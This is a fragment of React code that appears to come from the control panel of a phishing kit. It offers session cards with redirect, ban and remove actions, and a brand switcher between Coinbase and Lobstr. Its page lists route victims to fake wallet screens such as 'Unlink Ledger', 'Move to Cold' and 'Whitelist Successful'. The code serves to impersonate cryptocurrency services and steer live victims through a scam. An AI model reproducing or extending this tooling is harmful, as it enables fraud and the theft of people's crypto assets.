...
const MobileSessionCard = ({ session, onRedirect, onBan, onRemove, settings, isNew, selectedBrand }) => {
  const defaultPage = selectedBrand === 'Lobstr' ? 'lobstrloading.html' : 'loading.html';
...
const CategorizedPageSelect = ({ selectedPage, onPageChange, isHovered, selectedBrand = 'Coinbase' }) => {
  const brandPages = {
    ...
    Lobstr: {
      ...
      'Hardware Wallets': [
        { id: 'lobstrledgerdisconnect.html', name: 'Unlink Ledger' },
        { id: 'lobstrtrezordisconnect.html', name: 'Unlink Trezor' },
        { id: 'lobstrMoveToCold.html', name: 'Move to Cold' }
      ],
      Awaiting: [
        { id: 'lobstrPendingreview.html', name: 'Pending Review' }
      ],
      'Completed Task': [
        { id: 'lobstrCompleted.html', name: 'Review Completed' },
        { id: 'lobstrWhitelistSuccessful.html', name: 'Whitelist Successful' }
      ],
      Others: [
          ...
          <div className="px-6 py-4 border-b border-white/[0.06]">
            <div className="relative flex items-center justify-between">
              ...
              <div className="relative flex items-center space-x-2">
                <label className="text-sm text-white/60 mr-2">Brand:</label>
                <select
                  value={selectedBrand}
                ...
                >
                  <option value="Coinbase" className="bg-[#1A1A1A]">Coinbase</option>
                  <option value="Lobstr" className="bg-[#1A1A1A]">Lobstr</option>
                </select>
              </div>
            </div>
          </div>
